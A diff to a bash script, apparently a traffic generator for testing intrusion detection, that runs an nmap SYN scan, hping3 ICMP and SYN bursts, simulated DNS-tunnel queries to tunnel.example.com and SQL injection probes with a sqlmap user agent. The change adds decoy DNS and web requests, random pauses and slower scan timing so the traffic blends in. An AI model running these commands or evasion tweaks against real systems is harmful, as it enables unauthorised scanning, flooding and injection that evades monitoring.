@@ -30,14 +30,54 @@ run() {
     "$@" >/dev/null 2>&1 || true
 }
 
+pause_short() {
+    sleep "0.$((RANDOM % 5 + 3))"
+}
+
+background_dns() {
+    local domains=(
+        "example.com"
+        "python.org"
+        "debian.org"
+        "wikipedia.org"
+    )
+
+    for domain in "${domains[@]}"; do
+        run dig +short +time=1 +tries=1 "$domain" @"${DNS_SERVER}"
+        pause_short
+    done
+}
+
+background_http() {
+    local paths=(
+        "/"
+        "/favicon.ico"
+        "/robots.txt"
+    )
+
+    for path in "${paths[@]}"; do
+        run curl -s --connect-timeout 2 --max-time 2 "${HTTP_TARGET}${path}" -o /dev/null
+        pause_short
+    done
+}
+
+background_dns
+background_http
+
 run nmap -sS \
     -p 21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1723,3306,3389,5900,8080,8443,8888,9090,9200,9300 \
-    --min-rate 300 -T4 -n --open \
+    --scan-delay 30ms --max-retries 1 -T3 -n --open \
     "$TARGET"
 
-run hping3 --icmp --fast -c 120 "$TARGET"
+background_http
 
-run hping3 -S -p 80 --fast -c 120 "$TARGET"
+run hping3 --icmp -i u80000 -c 120 "$TARGET"
+
+background_dns
+
+run hping3 -S -p 80 -i u80000 -c 120 "$TARGET"
+
+background_http
 
 TUNNEL_LABELS=(
     "aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkaGVsbG93b3JsZA"
@@ -51,19 +91,25 @@ TUNNEL_LABELS=(
 
 for label in "${TUNNEL_LABELS[@]}"; do
     run dig +short +time=1 +tries=1 "${label}.tunnel.example.com" @"${DNS_SERVER}"
-    sleep 0.5
+    pause_short
 done
+
+background_dns
 
 run curl -s --connect-timeout 3 --max-time 3 \
     "${HTTP_TARGET}/index.php?id=%27%20OR%20%271%27%3D%271" \
     -o /dev/null
+
+pause_short
 
 run curl -s --connect-timeout 3 --max-time 3 \
     -A "sqlmap/1.7.8#stable (https://sqlmap.org)" \
     "${HTTP_TARGET}/" \
     -o /dev/null
 
+pause_short
+
 run curl -s --connect-timeout 3 --max-time 3 \
     -X POST "${HTTP_TARGET}/login" \
-    --data "username=admin&password=%27+OR+%271%27%3D%271" \
+    --data "username=admin&password=' OR '1'='1" \
     -o /dev/null
